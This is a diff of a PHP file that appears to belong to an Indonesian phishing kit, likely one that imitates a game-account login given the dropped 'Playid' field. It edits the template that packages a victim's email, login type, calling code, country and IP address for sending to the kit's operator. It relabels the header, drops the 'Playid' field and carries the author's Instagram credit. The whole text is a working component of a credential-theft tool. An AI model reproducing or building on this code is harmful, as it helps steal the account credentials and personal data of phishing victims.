@@ -51,7 +51,7 @@ header("Location: index.php");
 // KONTEN RESULT JANGAN DI UBAH NANTI EROR
 
 $text = urlencode("
-AKUN NGAB !!
+AKUNNYA TUAN :V
 ━━━━━━━━━━━━
 >> Type >> $login
 >> Email >> $email
@@ -63,11 +63,12 @@ AKUN NGAB !!
 >> Call Code >> $ccode
 >> Country >> $country
 >> IP Address >> $ip
->> Playid >> $playid
 >> Login >> $login
 ━━━━━━━━━━━━
+
 ~> ᴅᴀᴛᴇ » $time
 ━━━━━━━━━━━━
+
 
 ιɴsтᴀԍʀᴀм: @ᴀʀᴅʏɴvʏɴ__
 ");
